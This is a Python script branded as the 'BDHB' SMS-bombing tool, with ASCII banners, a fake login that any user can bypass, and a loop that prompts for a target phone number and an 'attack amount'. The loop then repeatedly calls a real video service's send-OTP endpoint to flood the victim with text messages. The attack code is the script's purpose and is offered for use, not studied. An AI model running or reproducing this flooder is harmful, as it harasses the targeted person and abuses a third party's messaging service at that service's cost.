import requests, os, time, sys, smtplib
blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'

os.system('clear')


def alamin(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.02)

alamin(red+"""________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ____shiddik___$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$_________BDHB_________$$$\n _______$$$____________________$$\n ________$$_________shiddik____$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$
██████╗ ██████╗ ██╗  ██╗██████╗ 
██╔══██╗██╔══██╗██║  ██║██╔══██╗
██████╔╝██║  ██║███████║██████╔╝
██╔══██╗██║  ██║██╔══██║██╔══██╗
██████╔╝██████╔╝██║  ██║██████╔╝
╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                
""")


def c (z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)
        
        
c("peles inter your username and Password ")






username=str(input(green+"     Username:"))

password=str(input(blue+"    password:"))

question=str(input(cyan+"    You know BDHB:"))




if password=='shiddik' and username=='bdhb' or question=='yes':
      print('Logged in successfully as SHIDDIK')
os.system('xdg-oetapen https://www.facebook.com/mn.shiddik.1')

  
 
        

os.system('clear')



def logop(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.006)



logop(green+'''



██████╗ ██████╗ ██╗  ██╗██████╗ 
██╔══██╗██╔══██╗██║  ██║██╔══██╗
██████╔╝██║  ██║███████║██████╔╝
██╔══██╗██║  ██║██╔══██║██╔══██╗
██████╔╝██████╔╝██║  ██║██████╔╝
╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
  
 ''')

os.system('clear')


logop(red+'''


 ██████╗████████╗ █████╗ ██████╗ ████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝
███████╗   ██║   ███████║██████╔╝   ██║   
╚════██║   ██║   ██╔══██║██╔══██╗   ██║   
███████║   ██║   ██║  ██║██║  ██║   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                            

''')

os.system('clear')

logo = '''


.########.##.....##..######..##....##
.##.......##.....##.##....##.##...##.
.##.......##.....##.##.......##..##..
.######...##.....##.##.......#####...
.##.......##.....##.##.......##..##..
.##.......##.....##.##....##.##...##.
.##........#######...######..##....##



BDHB............BOMBING
'''

print(logo)



import time,sys
logo= """
hello......attacker.......!

        soon......open..... your..... tool...BDHB
        
   BD Håçkër Bøys....
   
   
   admin.....shiddik....
   mod ..leader....ashraful vau....

"""
def logop(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.05)
logop(logo)


os.system('clear')

import time,sys

logo =(green+"""________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$""")
    
    
def logop(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)
logop(logo)


lo ="""

🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕🖕
👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿👿
🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩🇧🇩
"""

print(lo)

number=str(input(green+" Enter The target Number : "))

amount=int(input(red+" Enter The Attack Amount? : "))

shiddik="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"


for i in range(amount):
    requests.get(shiddik)
    print(str(i+1)+"[✓]SHIDDIK SMS Sent👿🖕👿")